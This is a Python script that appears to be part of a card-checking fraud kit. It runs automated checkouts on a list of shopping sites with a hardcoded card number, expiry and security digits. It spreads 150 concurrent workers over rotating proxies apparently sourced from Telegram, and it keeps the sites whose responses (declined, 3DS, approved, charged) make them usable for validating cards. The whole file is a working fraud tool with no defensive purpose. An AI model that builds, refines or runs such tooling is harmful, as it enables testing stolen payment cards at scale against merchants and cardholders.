#!/usr/bin/env python3
"""Re-validate v7/site.txt with a fixed card. Keep ONLY: card_declined, 3DS, approved,
charged, generic_error. Remove everything else (delivery-unavailable, processing-error, expired, etc.)."""
import asyncio, sys, os, time, argparse
from pathlib import Path

BASE = Path(__file__).resolve().parent
sys.path.insert(0, str(BASE))
from auto_async_v2 import run_checkout_for_card_async, normalize_proxy, CheckStatus

CC = "6011003009627793|08|27|069"
KEEP_CODES = {"CARD_DECLINED", "3DS_REQUIRED", "GENERIC_ERROR", "ORDER_PAID"}

def load(path):
    p = Path(path)
    return [l.strip() for l in p.read_text(errors="ignore").splitlines() if l.strip() and not l.strip().startswith("#")]

async def run_one(site, cc, proxies, base_i):
    t0 = time.time()
    for attempt in range(2):
        proxy = normalize_proxy(proxies[(abs(hash(site)) + base_i + attempt) % len(proxies)])
        try:
            res = await run_checkout_for_card_async(site, cc, proxy)
        except Exception as e:
            if attempt < 1 and any(k in str(e).lower() for k in ("curl","timeout","connection","resolve")):
                continue
            return (site, "EXCEPTION", "", round(time.time()-t0,1), False)
        code = (res.status_code or "").strip().upper() or "UNKNOWN"
        err = str(res.error)[:120].replace("\n"," ") if res.error else ""
        status = res.status.name if res.status is not None else "ERROR"
        keep = (status in ("CHARGED", "APPROVED")) or (code in KEEP_CODES)
        if not keep and attempt < 1 and any(k in err.lower() for k in ("catalog blocked","connection","timed out","timeout","curl:","resolve")):
            continue
        return (site, status, code, round(time.time()-t0,1), keep)
    return (site, "EXCEPTION", "", round(time.time()-t0,1), False)

async def worker(q, cc, proxies, kept, removed, lock, stop, base_i):
    while not stop.is_set():
        try:
            site = q.get_nowait()
        except asyncio.QueueEmpty:
            break
        site, status, code, dur, keep = await run_one(site, cc, proxies, base_i)
        async with lock:
            if keep:
                kept.append(site)
                print(f"KEEP  {status:<9} {dur:>5}s  {code:<28} {site}", flush=True)
            else:
                removed.append((site, status, code))
                print(f"DROP  {status:<9} {dur:>5}s  {code:<28} {site}", flush=True)
        q.task_done()

async def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--sites", default=str(BASE / "site.txt"))
    ap.add_argument("--proxies", default="/home/zirconium/Downloads/Telegram Desktop/live_proxies_349.txt")
    ap.add_argument("--concurrency", type=int, default=150)
    ap.add_argument("--out", default="/tmp/v7_recheck")
    a = ap.parse_args()

    sites = load(a.sites)
    proxies = load(a.proxies)
    os.makedirs(a.out, exist_ok=True)
    q = asyncio.Queue()
    for s in sites: q.put_nowait(s)
    kept = []; removed = []
    lock = asyncio.Lock(); stop = asyncio.Event()

    print(f"== v7 recheck: {len(sites)} sites | {len(proxies)} proxies | cc={CC} | {a.concurrency} workers | keep=card_declined/3ds/approved/charged/generic_error ==", flush=True)
    workers = [asyncio.create_task(worker(q, CC, proxies, kept, removed, lock, stop, i))
               for i in range(a.concurrency)]
    await asyncio.gather(*workers)

    # write results
    open(f"{a.out}/kept.txt","w").write("\n".join(sorted(kept)) + "\n")
    with open(f"{a.out}/removed.txt","w") as f:
        for site, status, code in removed:
            f.write(f"{site}  [{status}] {code}\n")
    print(f"== DONE == kept={len(kept)} removed={len(removed)} -> {a.out}", flush=True)

if __name__ == "__main__":
    asyncio.run(main())
